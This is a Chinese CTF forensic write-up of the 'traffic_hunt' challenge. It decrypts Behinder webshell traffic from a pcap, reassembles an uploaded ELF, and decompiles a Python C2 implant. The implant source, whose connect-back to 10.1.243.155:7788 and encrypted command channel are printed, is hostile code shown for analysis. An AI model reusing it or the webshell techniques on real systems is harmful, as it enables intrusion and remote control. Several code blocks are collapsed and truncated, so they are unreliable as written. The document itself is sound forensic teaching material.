---
title: 软件系统安全赛-traffic_hunt
contest: 软件系统安全赛
year: 2026
difficulty: hard
vuln_type: forensic_disk
tags:
- Behinder-webshell
- AES-ECB-MD5
- pcap-analysis
- traffic-encryption
- tshark
- AES-GCM
- python-pack
- C2-implant
- base64-extract
- ELF-reassemble
attack_chain:
- HTTP协议前半部分:目录扫描(404状态)
- 第404205包开始:植入Java class文件(冰蝎马第一阶段)
- 反编译class:使用p参数值的MD5前16字节作为AES ECB密钥
- p=HWmc2TLDoihdlr0N,key=1f2c8075acd3d118
- 后续流量:AES ECB加密的冰蝎载荷,tshark提取frame.number 404652-412212的POST data
- 攻击者用冰蝎文件上传模块,文件分片(blockIndex乱序)
- 前10文件顺序:404339(2)→404376(5)→404433(4)→404440(9)→404461(0)→404488(7)→404513(3)→404575(8)→404578(1)→404615(6)
- 11-349文件按blockIndex顺序,最后3个:412223(351)→412240(349)→412271(350)
- 拼接得ELF文件,运行发现是python打包
- pycdc反编译pyc:C2植入物,AES-GCM加密,key=IhbJfHI98nuSvs5JweD5qsNvSQ/HHcE/SNLyEBU9Phs=
- 报文:4 bytes长度|12 bytes nonce|n bytes密文|16 bytes GCM tag
- '解密冰蝎后流量得flag: dart{d9850b27-85cb-4777-85e0-df0b78fdb722}'
key_payload: dart{d9850b27-85cb-4777-85e0-df0b78fdb722}
one_liner: 软件系统安全赛traffic_hunt流量分析,冰蝎马AES-ECB+MD5(p)密钥推导+分片文件上传(blockIndex乱序重组)+Python pyc C2植入物+AES-GCM后渗透通信解密。
lesson: 冰蝎马用MD5(p)前16字节作AES-ECB密钥是标准实现;分片文件上传blockIndex乱序是流量侧的检测规避;Python打包的ELF+pyc反编译是C2分析常见路径;AES-GCM(4B长度+12B nonce+n字节密文+16B tag)是自定义协议稳定格式。
quality: high
full_path: 软件系统安全赛-traffic_hunt.full.md
meta_path: 软件系统安全赛-traffic_hunt.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 软件系统安全赛-traffic_hunt。软件系统安全赛traffic_hunt流量分析,冰蝎马AES-ECB+MD5(p)密钥推导+分片文件上传(blockIndex乱序重组)+Python pyc C2植入物+AES-GCM后渗透通信解密。。关键路径：HTTP协议前半部分:目录扫描(404状态) → 第404205包开始:植入Java class文件(冰蝎马第一阶段) → 反编译clas...
category: forensic
subcategory: disk_forensics
tools_used:
- Python
- tshark
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/302168.html
reasoning_chain:
- pcap 前半部分 HTTP 404 状态（目录扫描）→ 触发点：web 攻击流量
- 第 404205 包开始：植入 Java class（冰蝎马第一阶段）→ 假设：webshell 通信
- 反编译 class：使用 p 参数值的 MD5 前 16 字节作 AES-ECB 密钥
- p=HWmc2TLDoihdlr0N → key=MD5(p)[:16]=1f2c8075acd3d118
- 动作：tshark 提取 frame.number 404652-412212 的 POST data → AES-ECB 解密
- 观察：冰蝎文件上传模块，文件分片 (blockIndex 乱序) → 触发点：流量侧的检测规避
- 动作：按 blockIndex 重组前 10 文件（404339→404376→...→404615），11-349 按序，最后 412223/412240/412271
- 动作：拼接 ELF 文件 → 观察：python 打包（pyinstaller/py2exe）
- pycdc 反编译 pyc：C2 植入物，AES-GCM 加密，key=IhbJfHI98nuSvs5JweD5qsNvSQ/HHcE/SNLyEBU9Phs=
- 报文格式：4B 长度 + 12B nonce + n 字节密文 + 16B GCM tag → AES-GCM 解密后流量得 flag
- 'flag: dart{d9850b27-85cb-4777-85e0-df0b78fdb722}'
failed_attempts:
- 试图不解密直接读 HTTP 文本 → 失败：冰蝎流量全加密
- 按 packet 顺序拼分片 → 失败：blockIndex 乱序规避检测
- 用 IDA 反编译 ELF → 失败：Python 打包需要 pycdc/uncompyle6
key_observations:
- 冰蝎马用 MD5(p) 前 16 字节作 AES-ECB 密钥是标准实现
- 分片文件上传 blockIndex 乱序是流量侧检测规避
- Python 打包的 ELF + pyc 反编译是 C2 分析常见路径
- AES-GCM 自定义协议格式（4B 长度+12B nonce+n 字节密文+16B tag）稳定可识别
prerequisites:
- tshark 命令行过滤与字段提取
- AES-ECB / AES-GCM 加密模式
- 冰蝎 webshell 协议与 p 参数
- Python 打包 ELF 反编译（pycdc）
---
# 软件系统安全赛-traffic_hunt

> 原文: https://www.ctfiot.com/302168.html
> ID: 302168

traffic_hunt

题目给出的攻击流量HTTP协议前半部分是攻击者在对服务器进行目录扫描，从第404205个包开始攻击者向网站植入了木马
image-20260314181155807

看一下具体传了什么攻击载荷，如下图是个java的class文件，我们对他反编译一下
image-20260314181232959

可以发现这个载荷是第一阶段的冰蝎马，之后每个阶段将使用第一阶段载荷请求头中的p参数值进行md5后的前16个字节作为AES ECB模式的密钥加密后续冰蝎载荷
image-20260314181637550

在流量包中找到p值为HWmc2TLDoihdlr0N
image-20260314181722761

md5后的密钥为1f2c8075acd3d118
image-20260314181828939

接下来开始对后续载荷进行解密看一下攻击者做了些什么，进行了无意义操作
image-20260314181913782

查看当前用户信息
image-20260314181957629

之后的一连串均是攻击者在对受害主机信息进行收集，直到第404339这个包开始攻击者使用冰蝎内置文件上传模块进行文件上传，这里通过分片对文件进行上传
image-20260314182122579
image-20260314182207734

这里似乎是冰蝎为了规避流量侧的检测，将文件的传输顺序进行了调整，体现在blockIndex的顺序上，经过分析，前十个文件的顺序为

NO 404339 2NO 404376 5NO 404433 4NO 404440 9NO 404461 0NO 404488 7NO 404513 3NO 404575 8NO 404578 1NO 404615 6

从第11个文件到第349个文件按照blockIndex的顺序进行传输，然后最后三个传输顺序为

NO 412223 351NO 412240 349NO 412271 350

那么我们可以通过tshark提取出每个请求的data部分，然后使用1f2c8075acd3d118解密AES，然后并不需要反编译java字节码，只需要使用base64正则去匹配每个字节码文件中的base64部分即可，脚本如下所示：

import subprocessimportbase64import binasciiimport refrom Crypto.Cipher import AESPCAP_FILE ="traffic_hunt.pcapng"START = 404652END = 412212KEY = b"1f2c8075acd3d118"print("[*] Extracting POST data with tshark...")cmd = [ "tshark", "-r", PCAP_FILE, "-Y", f"frame.number>={START} && frame.number<={END} && http.request.method==POST && data.data", "-T","fields", "-e","data.data"]result = subprocess.run(cmd, capture_output=True, text=True)lines = [x.strip()forxinresult.stdout.split("n")ifx.strip()]print(f"[+] Extracted {len(lines)} data fields")cipher = AES.new(KEY, AES.MODE_ECB)base64_results = []forlineinlines: try: raw = binascii.unhexlify(line) decoded = base64.b64decode(raw) decrypted = cipher.decrypt(decoded) pad = decrypted[-1] ifpad <= 16: decrypted = decrypted[:-pad] matches = re.findall(rb'[A-Za-z0-9+/]{100,}={0,2}', decrypted) forminmatches: base64_results.append(m.decode()) 
except Exception: passprint(f"[+] Found {len(base64_results)} Base64 strings")with open("extracted_base64.txt","w") as f: forbinbase64_results: f.write(b +"n")print("[+] Saved to extracted_base64.txt")
image-20260314183615421

然后手动提取前十个和后三个流量包中的data字段，解密提取base64字段，然后按照上面提到的顺序进行拼接就可以得到一个elf文件
image-20260314184228328

运行后发现此elf文件是python打包后的
image-20260314184257060

解包就可以看到C2植入物的pyc文件
image-20260314184332556

反编译一下得到

#!/usr/bin/env python
# visit http://tool.lu/pyc/ for more informationimportosimportsocketimportstructimportsubprocessimportargparseimportsettingsimportbase64fromcryptography.hazmat.primitives.ciphers.aeadimportAESGCMSERVER_LISTEN_IP ='10.1.243.155'SERVER_LISTEN_PORT =7788IMPLANT_CONNECT_IP ='10.1.243.155'IMPLANT_CONNECT_PORT =7788SERVER_LISTEN_NUM =20_aesgcm =Nonedefset_aes_key(key_b64 =None): global_aesgcm key = base64.b64decode(key_b64) iflen(key)notin(16,24,32): raiseValueError('AES 密钥长度必须为 16, 24 或 32 字节（对应 128, 192, 256 位）') _aesgcm = AESGCM(key)defencrypt_data(data =None): if_aesgcmisNone: raiseRuntimeError('AES 密钥未初始化，请先调用 set_aes_key()') nonce = os.urandom(12) ciphertext = _aesgcm.encrypt(nonce, data,None) returnnonce + ciphertextdefdecrypt_data(encrypted_data =None): if_aesgcmisNone: raiseRuntimeError('AES 密钥未初始化，请先调用 set_aes_key()') iflen(encrypted_data) <28: raiseValueError('加密数据太短，无法包含 nonce 和认证标签') nonce = encrypted_data[:12] ciphertext_with_tag = encrypted_data[12:] plaintext = _aesgcm.decrypt(nonce, ciphertext_with_tag,None) returnplaintextdefexec_cmd(command, code_flag): command = command.decode('utf-8')
# WARNING: Decompyle incompletedefsend_data(conn, data): iftype(data) ==str: data = data.encode('utf-8') encrypted_data = settings.encrypt_data(data) cmd_len = struct.pack('i',len(encrypted_data)) conn.send(cmd_len) conn.send(encrypted_data)defrecv_data(sock, buf_size = (1024,)): x = sock.recv(4) all_size = struct.unpack('i', x)[0] recv_size =0 encrypted_data =b'' ifrecv_size < all_size: encrypted_data += sock.recv(buf_size) recv_size += buf_size continue data = settings.decrypt_data(encrypted_data) returndatadefmain(): sock = socket.socket() sock.connect((settings.IMPLANT_CONNECT_IP, settings.IMPLANT_CONNECT_PORT)) code_flag ='gbk'ifos.name =='nt'else'utf-8'# WARNING: Decompyle incompleteif__name__ =='__main__': parser = argparse.ArgumentParser('', **('description',)) parser.add_argument('--aes-key',True,'', **('required','help')) args = parser.parse_args() settings.set_aes_key(args.aes_key) main()

那也就是说攻击者在权限维持阶段没有继续使用冰蝎马，而是使用后门进行权限维持，我们继续看一下冰蝎马最后一部分的流量
image-20260314184613615

攻击者在运行受害者端植入物时传入了aes的秘钥IhbJfHI98nuSvs5JweD5qsNvSQ/HHcE/SNLyEBU9Phs=，那么后续的通信均使用此进行加密，具体的加密报文构成为

任意 4 bytes | 12 bytes 噪声 | n bytes 密文 | 16 bytes AES-GCM模式tag

我们在冰蝎马通信后的TCP流量中找到加密流量内容
image-20260314185019757

上面的原始数据完全符合报文格式，我们写脚本对其进行解密

importbase64importstructfromcryptography.hazmat.primitives.ciphers.aeadimportAESGCMkey_b64 ="IhbJfHI98nuSvs5JweD5qsNvSQ/HHcE/SNLyEBU9Phs="key = base64.b64decode(key_b64)aesgcm = AESGCM(key)hex_data ="""1f00000033740a2c22b1e703d2f1480b321f3e4cdc8eb50da84ca0a76543b6bbadf60a240000005c8a2365d717d71114b7be5599d5cfff553f2f0b2251505c3f5ada10a77be1bf35852f9c1e000000e3ee79aaf91b813d407e18095278046d32c10567fe57d60459d32f6df2341f000000bd345efc1465b04f38a410a09ed999e9849a570c27dd75e8d6b8aac5a4f22f30000000be53ef2dc360548f22bd7145f4e1733ffeb228db69b28e76ccb65ea9d8e33a709cfae6579a795f4045dbc2f6300cd8712b0000002b7991ad1cfcb2c0b334f5ee5cfb1be844f232c5062190e5e7bfb2208ef40aec6cff1aa7df01285fd3a92a6e0000008ac33897541bf959bb223309ffa07a25c49245bb988404180f84d7baef2c2ca8dfd669d39d3fa9c9e66b3da81834c7121cad53ffb16b38dcb062b2b3ce1b634f3bac9ed6e161661efb67ab754eb078718c484cb1b9ec873a103035fdc0b28ed418aa11e68b561599b9685ae54b95690000005fb656ee12487f33e75202b3bec1a6728977618d6b221fb887fa90d36cb5ff75949c1ae90608e22fc81a12fb2e576dd2df4330fcbf619b19455dcfe6c9ae2a8e730cf9010dcc3a15f04bec1fa70b051792d4e197cee0f075405b366472711d1d94f5bb349348bf05d524000000410d930f46d9e71c2200eb1fc4ec9986fd2d72ab2c35aa85fe66fa664a3729e3e9a906b61f0000007ccb9636b4b330000914519540b5a3b0bacb6f594c3b03ff582d62084c1af4"""hex_data ="".join(hex_data.split())data =bytes.fromhex(hex_data)offset =0msg_id =1whileoffset <len(data): length = struct.unpack("", plaintext) exceptExceptionase: print(f"[{msg_id}] decrypt failed:", e) msg_id +=1
image-20260314185139173

然后对3SoX7GyGU1KBVYS3DYFbfqQ2CHqH2aPGwpfeyvv5MPY5Dm1Wt9VYRumoUvzdmoLw6FUm4AMqR5zoi解码即可
image-20260314185208111

dart{d9850b27-85cb-4777-85e0-df0b78fdb722}


```
NO 404339 2NO 404376 5NO 404433 4NO 404440 9NO 404461 0NO 404488 7NO 404513 3NO 404575 8NO 404578 1NO 404615 6
NO 412223 351NO 412240 349NO 412271 350
import subprocessimportbase64import binasciiimport refrom Crypto.Cipher import AESPCAP_FILE ="traffic_hunt.pcapng"START = 404652END = 412212KEY = b"1f2c8075acd3d118"print("[*] Extracting POST data with tshark...")cmd = [ "tshark", "-r", PCAP_FILE, "-Y", f"frame.number>={START} && frame.number<={END} && http.request.method==POST && data.data", "-T","fields", "-e","data.data"]result = subprocess.run(cmd, capture_output=True, text=True)lines = [x.strip()forxinresult.stdout.split("n")ifx.strip()]print(f"[+] Extracted {len(lines)} data fields")cipher = AES.new(KEY, AES.MODE_ECB)base64_results = []forlineinlines: try: raw = binascii.unhexlify(line) decoded = base64.b64decode(raw) decrypted = cipher.decrypt(decoded) pad = decrypted[-1] ifpad <= 16: decrypted = decrypted[:-pad] matches = re.findall(rb'[A-Za-z0-9+/]{100,}={0,2}', decrypted) forminmatches: base64_results.append(m.decode()) 
except Exception: passprint(f"[+] Found {len(base64_results)} Base64 strings")with open("extracted_base64.txt","w") as f: forbinbase64_results: f.write(b +"n")print("[+] Saved to extracted_base64.txt")
#!/usr/bin/env python
# visit http://tool.lu/pyc/ for more informationimportosimportsocketimportstructimportsubprocessimportargparseimportsettingsimportbase64fromcryptography.hazmat.primitives.ciphers.aeadimportAESGCMSERVER_LISTEN_IP ='10.1.243.155'SERVER_LISTEN_PORT =7788IMPLANT_CONNECT_IP ='10.1.243.155'IMPLANT_CONNECT_PORT =7788SERVER_LISTEN_NUM =20_aesgcm =Nonedefset_aes_key(key_b64 =None): global_aesgcm key = base64.b64decode(key_b64) iflen(key)notin(16,24,32): raiseValueError('AES 密钥长度必须为 16, 24 或 32 字节（对应 128, 192, 256 位）') _aesgcm = AESGCM(key)defencrypt_data(data =None): if_aesgcmisNone: raiseRuntimeError('AES 密钥未初始化，请先调用 set_aes_key()') nonce = os.urandom(12) ciphertext = _aesgcm.encrypt(nonce, data,None) returnnonce + ciphertextdefdecrypt_data(encrypted_data =None): if_aesgcmisNone: raiseRuntimeError('AES 密钥未初始化，请先调用 set_aes_key()') iflen(encrypted_data) <28: raiseValueError('加密数据太短，无法包含 nonce 和认证标签') nonce = encrypted_data[:12] ciphertext_with_tag = encrypted_data[12:] plaintext = _aesgcm.decrypt(nonce, ciphertext_with_tag,None) returnplaintextdefexec_cmd(command, code_flag): command = command.decode('utf-8')
# WARNING: Decompyle incompletedefsend_data(conn, data): iftype(data) ==str: data = data.encode('utf-8') encrypted_data = settings.encrypt_data(data) cmd_len = struct.pack('i',len(encrypted_data)) conn.send(cmd_len) conn.send(encrypted_data)defrecv_data(sock, buf_size = (1024,)): x = sock.recv(4) all_size = struct.unpack('i', x)[0] recv_size =0 encrypted_data =b'' ifrecv_size < all_size: encrypted_data += sock.recv(buf_size) recv_size += buf_size continue data = settings.decrypt_data(encrypted_data) returndatadefmain(): sock = socket.socket() sock.connect((settings.IMPLANT_CONNECT_IP, settings.IMPLANT_CONNECT_PORT)) code_flag ='gbk'ifos.name =='nt'else'utf-8'# WARNING: Decompyle incompleteif__name__ =='__main__': parser = argparse.ArgumentParser('', **('description',)) parser.add_argument('--aes-key',True,'', **('required','help')) args = parser.parse_args() settings.set_aes_key(args.aes_key) main()
任意 4 bytes | 12 bytes 噪声 | n bytes 密文 | 16 bytes AES-GCM模式tag
importbase64importstructfromcryptography.hazmat.primitives.ciphers.aeadimportAESGCMkey_b64 ="IhbJfHI98nuSvs5JweD5qsNvSQ/HHcE/SNLyEBU9Phs="key = base64.b64decode(key_b64)aesgcm = AESGCM(key)hex_data ="""1f00000033740a2c22b1e703d2f1480b321f3e4cdc8eb50da84ca0a76543b6bbadf60a240000005c8a2365d717d71114b7be5599d5cfff553f2f0b2251505c3f5ada10a77be1bf35852f9c1e000000e3ee79aaf91b813d407e18095278046d32c10567fe57d60459d32f6df2341f000000bd345efc1465b04f38a410a09ed999e9849a570c27dd75e8d6b8aac5a4f22f30000000be53ef2dc360548f22bd7145f4e1733ffeb228db69b28e76ccb65ea9d8e33a709cfae6579a795f4045dbc2f6300cd8712b0000002b7991ad1cfcb2c0b334f5ee5cfb1be844f232c5062190e5e7bfb2208ef40aec6cff1aa7df01285fd3a92a6e0000008ac33897541bf959bb223309ffa07a25c49245bb988404180f84d7baef2c2ca8dfd669d39d3fa9c9e66b3da81834c7121cad53ffb16b38dcb062b2b3ce1b634f3bac9ed6e161661efb67ab754eb078718c484cb1b9ec873a103035fdc0b28ed418aa11e68b561599b9685ae54b95690000005fb656ee12487f33e75202b3bec1a6728977618d6b221fb887fa90d36cb5ff75949c1ae90608e22fc81a12fb2e576dd2df4330fcbf619b19455dcfe6c9ae2a8e730cf9010dcc3a15f04bec1fa70b051792d4e197cee0f075405b366472711d1d94f5bb349348bf05d524000000410d930f46d9e71c2200eb1fc4ec9986fd2d72ab2c35aa85fe66fa664a3729e3e9a906b61f0000007ccb9636b4b330000914519540b5a3b0bacb6f594c3b03ff582d62084c1af4"""hex_data ="".join(hex_data.split())data =bytes.fromhex(hex_data)offset =0msg_id =1whileoffset <len(data): length = struct.unpack("", plaintext) exceptExceptionase: print(f"[{msg_id}] decrypt failed:", e) msg_id +=1
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]